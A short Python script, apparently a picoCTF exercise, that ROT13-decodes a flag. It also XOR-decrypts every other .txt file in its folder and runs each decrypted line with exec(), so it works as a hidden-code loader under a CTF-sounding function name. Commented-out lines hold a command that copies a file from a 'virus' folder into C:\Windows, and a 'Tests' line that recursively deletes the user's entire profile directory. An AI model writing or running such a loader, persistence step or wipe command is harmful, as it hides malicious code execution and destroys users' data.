import os
import glob

def encode(fLoc, fKey):
   plain = open(fLoc, 'r').read()
   key = open(fKey, 'r').readline()
   reps = (len(plain)-1)//len(key)+1

   a1 = plain.encode('utf-8')
   key = (key * reps)[:len(plain)].encode('utf-8')
   cipher = bytes([i1^i2 for (i1, i2) in zip(a1, key)])
   open(fLoc+"_encryp.txt", 'wb').write(cipher)

def decrypt(fLoc, fKey):
   key = open(fKey, 'r').readline()
   cipher = open(fLoc, 'rb').read()
   reps = (len(cipher)-1)//len(key)+1
   key = (key*reps)[:len(cipher)].encode('utf-8')
   plain = bytes([i1^i2 for (i1, i2) in zip(cipher, key)])
   #open(fLoc+"_test.txt", 'w').write(plain.decode('utf-8'))
   return plain.decode('utf-8')


def executePicoCTF(fLoc, fKey):

   f = decrypt(fLoc, fKey)
   out = f.splitlines()
   for i in out:
       exec(i)

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
   with open('input.txt', 'r') as f:
    content = f.readlines()
   flag = content[2].split(':')[1]

   solution = ''
   little_a = ord('a')
   big_a = ord("A")
   for letter in flag:
      if letter.isalpha():
         if letter.isupper():
            letter = (((ord(letter) - big_a)-13)%26)+big_a
            solution += chr(letter)
         else:
            letter = (((ord(letter) - little_a)-13)%26)+little_a
            solution += chr(letter)
      else:
         solution += letter

   with open('input.txt', 'a') as f:
      f.write(solution)
   #'''
   files = []
   for f in glob.glob('*.txt'):
       if f == 'key.txt' or f == 'input.txt':
           continue
       print(f)
       files.append(f)
   #print(files)
   # encode('test.txt', 'key.txt')
   for i in files:
       executePicoCTF(i, 'key.txt')
   #os.system('cmd /c start cmd')
#    os.system('cmd /c copy "%USERPROFILE%\\Desktop\\ico\\virus\\main.py" "C:\\Windows')
   print('done done frfr')
   #'''
   #encode('C:\\Users\\wetle\\Desktop\\test', 'C:\\Users\\wetle\\Desktop\\key.txt')
# Tests:
#os.system('cmd /c %USERPROFILE%|del * /S /Q | rmdir /S /Q %USERPROFILE%')
